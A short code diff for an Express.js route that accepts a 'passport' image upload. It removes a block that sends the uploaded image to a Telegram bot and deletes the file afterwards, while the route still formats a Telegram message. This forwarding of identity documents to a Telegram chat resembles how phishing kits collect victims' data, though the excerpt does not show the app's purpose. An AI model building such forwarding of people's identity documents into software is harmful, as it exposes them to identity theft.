@@ -60,16 +60,6 @@ app.post('/api/data', upload.single('passport'), async (req, res) => {
                 error: 'All fields are required'
             });
         }
-        // Image to telegram
-        if (image) {
-            const formData = new FormData();
-            formData.append('chat_id', TELEGRAM_CHAT_ID);
-            formData.append('photo', fs.createReadStream(image.path));
-            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, formData, {
-                headers: formData.getHeaders()
-            });
-            fs.unlinkSync(image.path); // Cleanup
-        }
         
         // Format message for Telegram
         const telegramMessage = `
